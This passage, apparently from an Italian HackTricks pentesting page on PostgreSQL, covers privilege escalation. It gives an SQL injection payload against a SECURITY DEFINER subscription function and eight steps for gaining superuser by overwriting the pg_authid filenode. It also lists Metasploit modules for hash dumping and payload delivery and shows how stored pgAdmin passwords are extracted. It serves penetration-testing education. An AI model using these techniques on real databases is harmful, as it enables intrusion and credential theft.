<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Come [**spiegato nella documentazione**](https://www.postgresql.org/docs/current/sql-createfunction.html) una funzione con **SECURITY DEFINER viene eseguita** con i privilegi dell'**utente che la possiede**. Pertanto, se la funzione √® **vulnerabile all'SQL Injection** o sta eseguendo **azioni privilegiate con parametri controllati dall'attaccante**, potrebbe essere sfruttata per **escalare i privilegi all'interno di postgres**.

Nella riga 4 del codice precedente √® possibile vedere che la funzione ha il flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E poi **eseguire comandi**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Forzare l'accesso con PL/pgSQL

**PL/pgSQL** √® un **linguaggio di programmazione completo** che offre un maggiore controllo procedurale rispetto a SQL. Consente l'uso di **cicli** e altre **strutture di controllo** per migliorare la logica del programma. Inoltre, le **istruzioni SQL** e i **trigger** hanno la capacit√† di invocare funzioni create utilizzando il **linguaggio PL/pgSQL**. Questa integrazione consente un approccio pi√π completo e versatile alla programmazione e all'automazione del database.\
**√à possibile abusare di questo linguaggio per chiedere a PostgreSQL di forzare le credenziali degli utenti.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Privesc sovrascrivendo le tabelle interne di PostgreSQL

{% hint style="info" %}
Il seguente vettore di privesc √® particolarmente utile in contesti di SQLi limitati, poich√© tutti i passaggi possono essere eseguiti tramite istruzioni SELECT nidificate
{% endhint %}

Se puoi **leggere e scrivere file del server PostgreSQL**, puoi **diventare un superutente** sovrascrivendo il filenode su disco di PostgreSQL, associato alla tabella interna `pg_authid`.

Leggi di pi√π su **questa tecnica** [**qui**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

I passaggi dell'attacco sono:

1. Ottenere la directory dei dati di PostgreSQL
2. Ottenere un percorso relativo al filenode, associato alla tabella `pg_authid`
3. Scaricare il filenode tramite le funzioni `lo_*`
4. Ottenere il tipo di dati associato alla tabella `pg_authid`
5. Utilizzare il [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) per [modificare il filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); impostare tutti i flag booleani `rol*` su 1 per le autorizzazioni complete.
6. Ricaricare il filenode modificato tramite le funzioni `lo_*`, e sovrascrivere il file originale sul disco
7. _(Opzionale)_ Svuotare la cache della tabella in memoria eseguendo una query SQL costosa
8. Ora dovresti avere i privilegi di un superamministratore completo.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

All'interno del file _**postgresql.conf**_ √® possibile abilitare i log di postgresql modificando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Quindi, **riavvia il servizio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) √® una piattaforma di amministrazione e sviluppo per PostgreSQL.\
Puoi trovare **password** all'interno del file _**pgadmin4.db**_\
Puoi decifrarle utilizzando la funzione _**decrypt**_ all'interno dello script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

L'autenticazione del client in PostgreSQL √® gestita attraverso un file di configurazione chiamato **pg\_hba.conf**. Questo file contiene una serie di record, ciascuno specificando un tipo di connessione, intervallo di indirizzi IP del client (se applicabile), nome del database, nome utente e il metodo di autenticazione da utilizzare per le connessioni corrispondenti. Il primo record che corrisponde al tipo di connessione, all'indirizzo del client, al database richiesto e al nome utente viene utilizzato per l'autenticazione. Non c'√® alcun fallback o backup se l'autenticazione fallisce. Se nessun record corrisponde, l'accesso viene negato.

I metodi di autenticazione basati su password disponibili in pg\_hba.conf sono **md5**, **crypt** e **password**. Questi metodi differiscono per come la password viene trasmessa: in formato MD5-hash, crittografata con crypt o in testo normale. √à importante notare che il metodo crypt non pu√≤ essere utilizzato con password che sono state crittografate in pg\_authid.

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunit√† pi√π avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
